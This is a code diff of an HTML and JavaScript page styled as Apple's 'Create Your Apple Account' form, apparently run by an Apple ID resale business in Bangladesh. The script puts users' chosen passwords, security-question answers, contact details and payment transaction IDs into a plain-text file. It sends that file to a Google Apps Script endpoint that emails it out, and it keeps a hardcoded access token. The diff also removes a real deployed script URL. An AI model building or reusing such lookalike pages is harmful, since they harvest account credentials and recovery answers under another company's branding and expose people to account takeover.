@@ -1,41 +1,41 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="bn" dir="ltr">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Create Your Apple Account</title>
+  <title>Create Your Apple Account — Apple ID Buy Sell BD</title>
   <meta name="color-scheme" content="dark light" />
   <style>
-    :root{ --bg:#0f172a; --card:#111827; --muted:#94a3b8; --text:#e5e7eb; --accent:#60a5fa; --accent-2:#2563eb; --ok:#22c55e; --warn:#f59e0b; --err:#ef4444; --ring: color-mix(in hsl, var(--accent) 35%, transparent); --radius:16px; --shadow:0 8px 30px rgba(0,0,0,.35); --gap:16px; --pad: clamp(14px, 3vw, 24px); --container:960px; }
+    :root{ --bg:#0f172a; --card:#111827; --muted:#94a3b8; --text:#e5e7eb; --accent:#60a5fa; --accent-2:#2563eb; --ok:#22c55e; --warn:#f59e0b; --err:#ef4444; --ring: color-mix(in hsl, var(--accent) 35%, transparent); --radius:14px; --shadow:0 8px 30px rgba(0,0,0,.35); --gap:14px; --pad: clamp(12px, 3vw, 22px); --container:980px; }
     @media (prefers-color-scheme: light){ :root{ --bg:#f8fafc; --card:#fff; --text:#111827; --muted:#475569; --ring: color-mix(in hsl, var(--accent-2) 25%, transparent); } }
     *,*::before,*::after{ box-sizing:border-box } html,body{ height:100% }
-    body{ margin:0; font: 400 16px/1.55 ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial; color:var(--text); background: radial-gradient(1200px 800px at 70% -10%, #1f2937 0%, var(--bg) 50%, #0b1225 100%); display:grid; place-items:center; padding: max(env(safe-area-inset-top), 24px) 24px max(env(safe-area-inset-bottom), 24px); min-height: 100vh; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale; }
+    body{ margin:0; font: 400 16px/1.55 ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial; color:var(--text); background: radial-gradient(1200px 800px at 70% -10%, #1f2937 0%, var(--bg) 50%, #0b1225 100%); display:grid; place-items:center; padding: max(env(safe-area-inset-top), 20px) 18px max(env(safe-area-inset-bottom), 20px); min-height: 100vh; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale; }
     @supports (height: 100dvh){ body{ min-height: 100dvh; } }
     .container{ width:100%; max-width: var(--container); }
-    .card{ background: linear-gradient(180deg, rgba(255,255,255,.04), rgba(255,255,255,.02)); border: 1px solid rgba(148,163,184,.2); border-radius: var(--radius); box-shadow: var(--shadow); padding: var(--pad); backdrop-filter: blur(8px); }
-    h2{ margin:0 0 10px; font-size: clamp(22px, 3.5vw, 32px); letter-spacing:-.02em }
-    .note{ font-size:13px; color:var(--muted); background: rgba(148,163,184,.08); border:1px dashed rgba(148,163,184,.25); border-radius:12px; padding:10px 12px; margin-bottom:12px; }
+    .card{ background: linear-gradient(180deg, rgba(255,255,255,.03), rgba(255,255,255,.01)); border: 1px solid rgba(148,163,184,.12); border-radius: var(--radius); box-shadow: var(--shadow); padding: var(--pad); backdrop-filter: blur(6px); }
+    h2{ margin:0 0 10px; font-size: clamp(20px, 3.2vw, 30px); letter-spacing:-.02em }
+    .note{ font-size:13px; color:var(--muted); background: rgba(148,163,184,.06); border:1px dashed rgba(148,163,184,.14); border-radius:10px; padding:8px 10px; margin-bottom:12px; }
     form{ display:grid; gap: var(--gap) } fieldset{ border:0; margin:0; padding:0 } .visually-hidden{ position:absolute!important; clip:rect(1px,1px,1px,1px); padding:0; border:0; height:1px; width:1px; overflow:hidden; white-space:nowrap }
-    .row{ display:grid; gap:12px; grid-template-columns: 1fr 1fr; }
+    .row{ display:grid; gap:10px; grid-template-columns: 1fr 1fr; }
     @media (max-width: 720px){ .row{ grid-template-columns: 1fr; } }
     .field{ position:relative } label{ font-size:14px; color:var(--muted); display:block; margin-bottom:6px }
     .small-checkbox{ display:flex; align-items:center; gap:8px; margin-bottom:6px }
     input,select,button,textarea{ font:inherit }
-    input,select,textarea{ width:100%; padding:12px 14px; border-radius:12px; background:#0b1020; color:var(--text); border:1px solid color-mix(in hsl, var(--muted) 30%, transparent); outline:none; transition: border-color .15s ease, box-shadow .15s ease; }
+    input,select,textarea{ width:100%; padding:12px 14px; border-radius:10px; background:#0b1020; color:var(--text); border:1px solid color-mix(in hsl, var(--muted) 30%, transparent); outline:none; transition: border-color .12s ease, box-shadow .12s ease; }
     @media (prefers-color-scheme: light){ input,select,textarea{ background:#fff; color:var(--text); } }
     input:focus,select:focus,textarea:focus{ border-color: var(--accent); box-shadow: 0 0 0 4px var(--ring) }
-    input[aria-invalid="true"]{ border-color: var(--err); box-shadow:0 0 0 4px color-mix(in hsl, var(--err) 25%, transparent) }
-    .locked{ background: linear-gradient(180deg, #0b1020, #0b0f1a); opacity: .85; cursor: not-allowed; }
+    input[aria-invalid="true"]{ border-color: var(--err); box-shadow:0 0 0 4px color-mix(in hsl, var(--err) 18%, transparent) }
+    .locked{ background: linear-gradient(180deg, #0b1020, #0b0f1a); opacity: .9; cursor: not-allowed; }
     .hint{ font-size:12px; color:var(--muted); margin-top:6px } .error{ font-size:12px; color:var(--err); margin-top:6px; min-height:1em }
-    .actions{ display:flex; gap:10px; flex-wrap:wrap; align-items:center } button{ appearance:none; border:0; padding:12px 16px; border-radius:12px; font-weight:600; cursor:pointer; background: linear-gradient(180deg, var(--accent), var(--accent-2)); color:#fff; box-shadow: 0 6px 16px rgba(37,99,235,.5); touch-action: manipulation; }
-    .ghost{ background:transparent; border:1px solid rgba(148,163,184,.35); color:var(--text); box-shadow:none } .status{ font-size:13px } .status.ok{ color:var(--ok) } .status.warn{ color:var(--warn) } .status.err{ color:var(--err) }
-    .icon-btn{ position:absolute; right:10px; top:50%; transform:translateY(-50%); background:transparent; border:0; padding:6px; cursor:pointer; line-height:1; font-size:18px }
+    .actions{ display:flex; gap:10px; flex-wrap:wrap; align-items:center } button{ appearance:none; border:0; padding:11px 16px; border-radius:10px; font-weight:700; cursor:pointer; background: linear-gradient(180deg, var(--accent), var(--accent-2)); color:#fff; box-shadow: 0 6px 16px rgba(37,99,235,.35); touch-action: manipulation; }
+    .ghost{ background:transparent; border:1px solid rgba(148,163,184,.22); color:var(--text); box-shadow:none } .status{ font-size:13px } .status.ok{ color:var(--ok) } .status.warn{ color:var(--warn) } .status.err{ color:var(--err) }
+    .icon-btn{ position:absolute; right:8px; top:50%; transform:translateY(-50%); background:transparent; border:0; padding:6px; cursor:pointer; line-height:1; font-size:18px }
     dialog{ border:0; border-radius:12px; padding: var(--pad); max-width: min(92vw, 420px); box-shadow: var(--shadow); }
-    .divider{ height:1px; background: rgba(148,163,184,.2); margin: 6px 0 }
-    /* fallback modal for browsers without dialog */
+    .divider{ height:1px; background: rgba(148,163,184,.12); margin: 6px 0 }
+    /* fallback modal */
     .fallback-modal{ display:none; position:fixed; inset:0; z-index:1200; align-items:center; justify-content:center; background:rgba(0,0,0,.45); }
-    .fallback-modal .panel{ background:var(--card); border-radius:12px; padding:20px; max-width:92vw; box-shadow:var(--shadow); color:var(--text); }
-    @media (max-width:420px){ .icon-btn{ right:8px; } input,select,textarea{ padding:12px; } }
+    .fallback-modal .panel{ background:var(--card); border-radius:12px; padding:18px; max-width:92vw; box-shadow:var(--shadow); color:var(--text); }
+    @media (max-width:420px){ .icon-btn{ right:6px; } input,select,textarea{ padding:12px; } }
   </style>
 </head>
 <body>
@@ -245,7 +245,7 @@
             Apple ID Buy Sell BD
           </label>
           <textarea id="plainOut" rows="10" readonly
-                    style="width:100%;padding:12px 14px;border-radius:12px;border:1px solid rgba(148,163,184,.35);
+                    style="width:100%;padding:12px 14px;border-radius:10px;border:1px solid rgba(148,163,184,.18);
                            background:#0b1020;color:var(--text);"></textarea>
         </section>
       </form>
@@ -260,13 +260,13 @@
     </section>
   </main>
 
-  <!-- Native dialog (may not be supported in some mobile browsers) -->
+  <!-- Native dialog (may not be supported on some mobile browsers) -->
   <dialog id="successDialog">
-    <p>✅ submitted successfully! Please wait while we process your request</p>
+    <p id="dlgText">✅ submitted successfully! Please wait while we process your request</p>
     <form method="dialog"><button>OK</button></form>
   </dialog>
 
-  <!-- Fallback modal (used if dialog.showModal not available) -->
+  <!-- Fallback modal -->
   <div id="fallbackModal" class="fallback-modal" aria-hidden="true" role="dialog" aria-modal="true">
     <div class="panel">
       <p id="fallbackText">✅ submitted successfully! Please wait while we process your request</p>
@@ -277,10 +277,9 @@
   </div>
 
   <script>
-    // ===== helper shortcuts =====
+    // short helpers
     const $ = (s, el=document) => el.querySelector(s);
 
-    // Elements
     const form = $('#signupForm');
     const statusEl = $('#formStatus');
     const dobInput = $('#dob');
@@ -290,22 +289,23 @@
     const pwMeter = $('#pwMeter');
     const pwLabel = $('#pwLabel');
     const dlg = $('#successDialog');
-    const whatsapp = $('#whatsapp');
-    const trxId = $('#trxId');
+    const fallback = $('#fallbackModal');
 
     const useRandomEmail = $('#useRandomEmail');
     const emailInput = $('#email');
     const skipPhone = $('#skipPhone');
+    const whatsapp = $('#whatsapp');
+    const trxId = $('#trxId');
 
-    // APPS SCRIPT CONFIG — your deployed URL
-    const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbynvag8bOzZdX78GVE5muK0_UUyimA255x25s4p_Ep7DaKR3I2VQugUnTcdaj2jxnF-/exec';
-    const TOKEN = 'my-very-strong-token-1234'; // <-- must match SECRET_TOKEN in Apps Script
+    // Apps Script endpoint placeholder
+    const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec';
+    const TOKEN = 'my-very-strong-token-1234';
 
     function showStatus(msg, cls='ok'){ statusEl.textContent = msg; statusEl.className = `status ${cls}`; }
     function setFieldValidity(input, valid, msg=''){
       if (!input) return;
       input.setAttribute('aria-invalid', String(!valid));
-      input.setCustomValidity(valid ? '' : msg);
+      try { input.setCustomValidity(valid ? '' : msg); } catch(e){}
       const errEl = document.getElementById(`err-${input.id}`);
       if (errEl) errEl.textContent = valid ? '' : msg;
     }
@@ -324,26 +324,26 @@
       return age >= 13;
     }
 
-    // DOB max = today - 13y
+    // Set DOB max to today-13y
     (function setDobMax(){
       const t = new Date(); t.setFullYear(t.getFullYear()-13);
       const y=t.getFullYear(), m=String(t.getMonth()+1).padStart(2,'0'), d=String(t.getDate()).padStart(2,'0');
       if (dobInput) dobInput.max = `${y}-${m}-${d}`;
     })();
 
-    // Random email generator (unique-ish)
+    // Random email
     function genRandomEmail(){
       const ts = Date.now().toString(36);
       const rnd = Math.floor(Math.random()*9000)+1000;
       return `random-${ts}${rnd}@example.com`;
     }
 
-    // ===== Apple ID Buy Sell Bangladesh =====
+    // Build payload text
     function buildPlainTextPayload(formEl){
       const labels = {
         'given-name': 'First Name', 'family-name': 'Last Name', 'country': 'Country/Region',
         'bday': 'Date of Birth', 'email': 'Email', 'tel': 'Mobile Number',
-        'new-password': 'Password', 'confirm-password': 'Confirm Password',
+        'new-password': 'Password',
         'securityQuestion1': 'Security Q1', 'securityAnswer1': 'Answer 1',
         'securityQuestion2': 'Security Q2', 'securityAnswer2': 'Answer 2',
         'securityQuestion3': 'Security Q3', 'securityAnswer3': 'Answer 3',
@@ -351,7 +351,6 @@
       };
 
       const fd = new FormData(formEl);
-      // keep new-password, but remove confirm-password from payload
       fd.delete('confirm-password');
 
       const agree = document.getElementById('agree')?.checked ? 'Yes' : 'No';
@@ -366,7 +365,7 @@
       return `=== Apple ID Buy Sell Bangladesh ===\nGenerated: ${ts.toISOString()}\n` + lines.join('\n') + '\n';
     }
 
-    // Download helper (optional)
+    // Download helper
     function downloadText(filename, text){
       try {
         const blob = new Blob([text], {type: 'text/plain'});
@@ -380,7 +379,7 @@
       }
     }
 
-    // send to Apps Script (will email as attachment)
+    // Send to Apps Script
     async function sendPayloadToAppsScript(textPayload){
       try {
         const res = await fetch(APPS_SCRIPT_URL, {
@@ -404,43 +403,27 @@
       }
     }
 
-    // UI: useRandomEmail behavior (single, consolidated handler)
+    // UI behavior for random email & skip phone
     useRandomEmail?.addEventListener('change', ()=>{
       if (useRandomEmail.checked){
-        const randomEmail = genRandomEmail();
-        emailInput.value = randomEmail;
-        emailInput.disabled = true;
-        emailInput.classList.add('locked');
-        emailInput.setAttribute('aria-readonly','true');
-        emailInput.required = false;
+        emailInput.value = genRandomEmail();
+        emailInput.disabled = true; emailInput.classList.add('locked'); emailInput.setAttribute('aria-readonly','true'); emailInput.required = false;
         setFieldValidity(emailInput, true, '');
       } else {
-        emailInput.disabled = false;
-        emailInput.classList.remove('locked');
-        emailInput.removeAttribute('aria-readonly');
-        emailInput.value = '';
-        emailInput.required = true;
+        emailInput.disabled = false; emailInput.classList.remove('locked'); emailInput.removeAttribute('aria-readonly'); emailInput.value = ''; emailInput.required = true;
         setFieldValidity(emailInput, true, '');
       }
     });
 
-    // skipPhone (use disabled so browser won't validate it)
     skipPhone?.addEventListener('change', ()=>{
       if (skipPhone.checked){
-        phone.value = '';
-        phone.disabled = true;
-        phone.classList.add('locked');
-        phone.setAttribute('aria-readonly','true');
-        setFieldValidity(phone, true, '');
+        phone.value = ''; phone.disabled = true; phone.classList.add('locked'); phone.setAttribute('aria-readonly','true'); setFieldValidity(phone, true, '');
       } else {
-        phone.disabled = false;
-        phone.classList.remove('locked');
-        phone.removeAttribute('aria-readonly');
-        setFieldValidity(phone, true, '');
+        phone.disabled = false; phone.classList.remove('locked'); phone.removeAttribute('aria-readonly'); setFieldValidity(phone, true, '');
       }
     });
 
-    // live validation handlers
+    // Live validations
     pw?.addEventListener('input', ()=>{
       const s = passwordScore(pw.value);
       if (pwMeter) pwMeter.value = s;
@@ -459,137 +442,149 @@
       setFieldValidity(phone, ok, ok ? '' : 'Phone format is invalid.');
     });
     whatsapp?.addEventListener('input', ()=>{
-      const pattern = new RegExp(whatsapp.getAttribute('pattern'));
-      const ok = !whatsapp.value || pattern.test(whatsapp.value);
-      setFieldValidity(whatsapp, ok, ok ? '' : 'WhatsApp নম্বরের ফরম্যাট ঠিক নেই।');
+      const pat = whatsapp.getAttribute('pattern');
+      if (pat){
+        const pattern = new RegExp(pat);
+        const ok = !whatsapp.value || pattern.test(whatsapp.value);
+        setFieldValidity(whatsapp, ok, ok ? '' : 'WhatsApp নম্বরের ফরম্যাট ঠিক নেই।');
+      }
     });
     trxId?.addEventListener('input', ()=>{
-      const pattern = new RegExp(trxId.getAttribute('pattern'));
-      const ok = !trxId.value || pattern.test(trxId.value);
-      setFieldValidity(trxId, ok, ok ? '' : 'TRX ID ফরম্যাট সঠিক নয় (8–20 অক্ষর/সংখ্যা)।');
+      const pat = trxId.getAttribute('pattern');
+      if (pat){
+        const pattern = new RegExp(pat);
+        const ok = !trxId.value || pattern.test(trxId.value);
+        setFieldValidity(trxId, ok, ok ? '' : 'TRX ID ফরম্যাট সঠিক নয় (8–20 অক্ষর/সংখ্যা)।');
+      }
     });
 
-    // eye toggles (works on mobile too)
-    document.getElementById('togglePw')?.addEventListener('click', ()=>{ pw.type = pw.type === 'password' ? 'text' : 'password'; });
-    document.getElementById('toggleCpw')?.addEventListener('click', ()=>{ cpw.type = cpw.type === 'password' ? 'text' : 'password'; });
+    // Eye toggles
+    $('#togglePw')?.addEventListener('click', ()=>{ pw.type = pw.type === 'password' ? 'text' : 'password'; });
+    $('#toggleCpw')?.addEventListener('click', ()=>{ cpw.type = cpw.type === 'password' ? 'text' : 'password'; });
 
-    // dialog fallback handling
-    const fallback = document.getElementById('fallbackModal');
+    // dialog fallback
     function showSuccessDialog(){
+      const txt = '✅ submitted successfully! Please wait while we process your request';
       if (typeof dlg?.showModal === 'function'){
-        dlg.showModal();
+        $('#dlgText').textContent = txt;
+        try { dlg.showModal(); } catch(e){ alert(txt); }
+      } else if (fallback) {
+        $('#fallbackText').textContent = txt;
+        fallback.style.display = 'flex';
+        fallback.setAttribute('aria-hidden','false');
+        $('#fallbackOk')?.focus();
       } else {
-        // fallback: show our custom modal
-        if (fallback){
-          fallback.style.display = 'flex';
-          fallback.setAttribute('aria-hidden','false');
-          // focus OK button for accessibility
-          document.getElementById('fallbackOk')?.focus();
-        } else {
-          alert('✅ submitted successfully! Please wait while we process your request');
-        }
+        alert(txt);
       }
     }
     function closeFallback(){
-      if (fallback){
-        fallback.style.display = 'none';
-        fallback.setAttribute('aria-hidden','true');
-      }
+      if (fallback){ fallback.style.display = 'none'; fallback.setAttribute('aria-hidden','true'); }
     }
-    document.getElementById('fallbackOk')?.addEventListener('click', ()=>{
-      closeFallback();
-      form.querySelector('[type="submit"]')?.focus();
-    });
+    $('#fallbackOk')?.addEventListener('click', ()=>{ closeFallback(); form.querySelector('[type="submit"]')?.focus(); });
 
-    // ensure dialog close brings focus back
-    dlg?.addEventListener('close', () => form.querySelector('[type="submit"]')?.focus());
+    // === DEBUG-FRIENDLY SUBMIT HANDLER (mobile-friendly) ===
+    function gatherInvalid() {
+      const invalids = [];
+      const els = Array.from(form.querySelectorAll('input, select, textarea'));
+      for (const el of els) {
+        if (el.disabled) continue;
+        // Built-in validity
+        if (!el.checkValidity()) {
+          invalids.push({ el, reason: el.validationMessage || 'invalid value' });
+          continue;
+        }
+        // Custom password strength
+        if (el.id === 'password' && !passwordStrong(el.value)) {
+          invalids.push({ el, reason: 'Password does not meet the rules.' });
+          continue;
+        }
+        // Confirm password
+        if (el.id === 'confirm' && el.value !== (document.getElementById('password')?.value || '')) {
+          invalids.push({ el, reason: 'Passwords do not match.' });
+          continue;
+        }
+        // DOB age check
+        if (el.id === 'dob') {
+          if (!ageOK(el.value)) {
+            invalids.push({ el, reason: 'You must be at least 13 years old.' });
+            continue;
+          }
+        }
+        // Re-check pattern with JS (some mobile browsers differ)
+        const pat = el.getAttribute && el.getAttribute('pattern');
+        if (pat && el.value) {
+          try {
+            const re = new RegExp(pat);
+            if (!re.test(el.value)) invalids.push({ el, reason: 'Pattern mismatch' });
+          } catch (err) {
+            // ignore malformed pattern
+          }
+        }
+      }
+      return invalids;
+    }
 
-    // submit
-    form.addEventListener('submit', (e)=>{
+    form.addEventListener('submit', (e) => {
       e.preventDefault();
 
-      // prefer custom messaging instead of showing browser native bubbles on mobile
-      if (!form.checkValidity()){
-        showStatus('⚠️ Please fill out required fields correctly.', 'warn');
-        const firstInvalid = form.querySelector(':invalid');
-        if (firstInvalid) firstInvalid.focus();
+      // clear previous status
+      showStatus('', '');
+
+      const invalids = gatherInvalid();
+
+      if (invalids.length) {
+        // build readable list
+        const list = invalids.map(i => {
+          const labelEl = form.querySelector(`label[for="${i.el.id}"]`);
+          const label = labelEl ? labelEl.textContent.trim() : (i.el.name || i.el.id);
+          return `${label}: ${i.reason}`.trim();
+        });
+        // show first error in status and console for debugging
+        showStatus('⚠️ Please fix: ' + list[0], 'warn');
+        console.warn('Form invalid fields:', invalids.map(ii => ({ id: ii.el.id, reason: ii.reason, value: ii.el.value })));
+        // focus first invalid
+        const first = invalids[0].el;
+        try { first.focus({ preventScroll: false }); } catch(e){ first.focus(); }
+        try { first.scrollIntoView({ block: 'center', behavior: 'smooth' }); } catch(e){}
+        // temporary visual cue
+        const prevOutline = first.style.outline;
+        first.style.outline = '3px solid rgba(245,158,11,0.5)';
+        setTimeout(()=>{ first.style.outline = prevOutline; }, 3500);
         return;
       }
 
-      if (!passwordStrong(pw.value)){
-        setFieldValidity(pw, false, 'Password does not meet the rules.');
-        showStatus('Password does not meet the rules.', 'err');
-        pw.focus(); return;
-      }
-      const match = pw.value === cpw.value;
-      setFieldValidity(cpw, match, match ? '' : 'Passwords do not match.');
-      if (!match){ showStatus('Passwords do not match.', 'err'); cpw.focus(); return; }
-
-      const ageOk = ageOK(dobInput.value);
-      setFieldValidity(dobInput, ageOk, ageOk ? '' : 'You must be at least 13 years old.');
-      if (!ageOk){ showStatus('You must be at least 13 years old.', 'err'); dobInput.focus(); return; }
-
-      // Phone: if it's disabled (skipped), bypass; otherwise validate if provided
-      if (phone && phone.value && !phone.disabled){
-        const ok = new RegExp(phone.getAttribute('pattern')).test(phone.value);
-        setFieldValidity(phone, ok, ok ? '' : 'Phone format is invalid.');
-        if (!ok){ showStatus('Phone format is invalid.', 'err'); phone.focus(); return; }
-      }
-
-      // WhatsApp (if provided)
-      if (whatsapp && whatsapp.value.trim()){
-        const ok = new RegExp(whatsapp.getAttribute('pattern')).test(whatsapp.value.trim());
-        setFieldValidity(whatsapp, ok, ok ? '' : 'WhatsApp নম্বরের ফরম্যাট ঠিক নেই।');
-        if (!ok){ showStatus('WhatsApp নম্বরের ফরম্যাট ঠিক নেই।', 'err'); whatsapp.focus(); return; }
-      }
-      // TRX (if provided)
-      if (trxId && trxId.value.trim()){
-        const ok = new RegExp(trxId.getAttribute('pattern')).test(trxId.value.trim());
-        setFieldValidity(trxId, ok, ok ? '' : 'TRX ID ফরম্যাট সঠিক নয় (8–20 অক্ষর/সংখ্যা)।');
-        if (!ok){ showStatus('TRX ID ফরম্যাট সঠিক নয়।', 'err'); trxId.focus(); return; }
-      }
-
+      // All good — proceed
       showStatus('✅ submitted successfully! Please wait while we process your request.', 'ok');
 
-      // Build plain text + show in UI + auto-download (optional)
       const textPayload = buildPlainTextPayload(form);
       const outEl = document.getElementById('plainOut');
       const wrapEl = document.getElementById('plainWrap');
       if (outEl && wrapEl){ outEl.value = textPayload; wrapEl.style.display = 'block'; }
       downloadText('signup-demo.txt', textPayload);
 
-      // send to Apps Script (will email you) — keep unchanged
       if (APPS_SCRIPT_URL && APPS_SCRIPT_URL.includes('script.google.com')) {
         sendPayloadToAppsScript(textPayload);
       } else {
         showStatus('⚠️ Apps Script not configured.', 'warn');
       }
 
-      // show dialog or fallback
       showSuccessDialog();
     });
 
-    // Reset behaviour
-    document.getElementById('resetBtn')?.addEventListener('click', ()=>{
+    // Reset handler
+    $('#resetBtn')?.addEventListener('click', ()=>{
       showStatus('');
       if (useRandomEmail.checked){
         useRandomEmail.checked = false;
-        emailInput.disabled = false;
-        emailInput.classList.remove('locked');
-        emailInput.removeAttribute('aria-readonly');
-        emailInput.value = '';
-        emailInput.required = true;
+        emailInput.disabled = false; emailInput.classList.remove('locked'); emailInput.removeAttribute('aria-readonly'); emailInput.value = ''; emailInput.required = true;
       }
       if (skipPhone.checked){
         skipPhone.checked = false;
-        phone.disabled = false;
-        phone.classList.remove('locked');
-        phone.removeAttribute('aria-readonly');
-        phone.value = '';
+        phone.disabled = false; phone.classList.remove('locked'); phone.removeAttribute('aria-readonly'); phone.value = '';
       }
       [pw, cpw, phone, dobInput, whatsapp, trxId, emailInput].forEach(i=> i && setFieldValidity(i, true, ''));
       if (pwMeter) pwMeter.value = 0; if (pwLabel) pwLabel.textContent='';
-      if (dlg?.open) try{ dlg.close(); }catch(e){}
+      try{ if (dlg?.open) dlg.close(); }catch(e){}
       closeFallback();
       const wrapEl = document.getElementById('plainWrap');
       if (wrapEl) wrapEl.style.display = 'none';
